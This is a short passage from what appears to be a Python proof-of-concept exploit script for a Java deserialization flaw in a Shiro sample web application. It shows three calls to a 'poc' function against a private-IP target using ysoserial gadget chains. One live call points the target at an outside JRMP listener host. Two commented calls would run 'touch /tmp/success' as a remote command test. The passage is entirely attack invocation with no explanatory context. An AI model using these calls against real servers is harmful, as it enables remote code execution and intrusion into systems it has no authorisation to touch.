...
poc('http://192.168.78.166:8080/samples-web-1.4.1/','xx.xx.xxx.xx:1099',keys[0],'JRMPClient')
# poc('http://192.168.78.166:8080/samples-web-1.4.1/','touch /tmp/success',keys[0],'CommonsCollections3')
# poc('http://192.168.78.166:8080/samples-web-1.4.1/','touch /tmp/success',keys[0],'CommonsBeanutils1')